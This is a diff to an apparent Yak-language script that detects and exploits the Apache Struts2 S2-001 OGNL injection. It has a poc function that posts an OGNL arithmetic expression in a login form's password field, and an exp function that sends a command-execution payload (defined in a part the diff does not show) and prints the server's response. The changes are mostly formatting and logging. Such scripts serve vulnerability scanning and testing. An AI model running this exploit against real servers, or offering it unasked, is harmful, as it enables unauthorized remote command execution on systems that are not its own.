@@ -1,25 +1,29 @@
+
 //定义检测函数
 func poc(url){
-num1 = randn(10000,100000)
-num2 = randn(10000,100000)
+
+    num1 = randn(10000,100000)
+    num2 = randn(10000,100000)
 
 
-check_poc = sprintf("%s%d%s%d%s","%25%7B",num1,"%2B",num2,"%7D")
-req, err = http.Post(
+    check_poc = sprintf("%s%d%s%d%s","%25%7B",num1,"%2B",num2,"%7D")
+    req, err = http.Post(
         url,
         http.useragent(http.uarand()),
         http.header("Content-Type","application/x-www-form-urlencoded"),
         http.body(sprintf("username=test&password=%s",check_poc)),
-        )
+    )
     if err != nil {
         return
     }
     if re.Match(parseStr(num1+num2),http.GetAllBody(req)){
-    	log.warn("S2_001 found !!!")
+        log.warn( url + " S2_001 found !!!")
     }else{
-        log.debug("S2_001 safe !!!")
+        log.debug(url + " S2_001 safe !!!")
     }
+    
 }
+
 
 //定义利用函数
 func exp(url,cmd){
@@ -32,9 +36,9 @@ func exp(url,cmd){
         http.header("Content-Type","application/x-www-form-urlencoded"),
         http.body(sprintf("username=test&password=%s",exec_payload)),
         )
-    http.show(req)
+    println(string(http.GetAllBody(req)))
+   // http.show(req)
 }
-
 
 
 if YAK_MAIN {
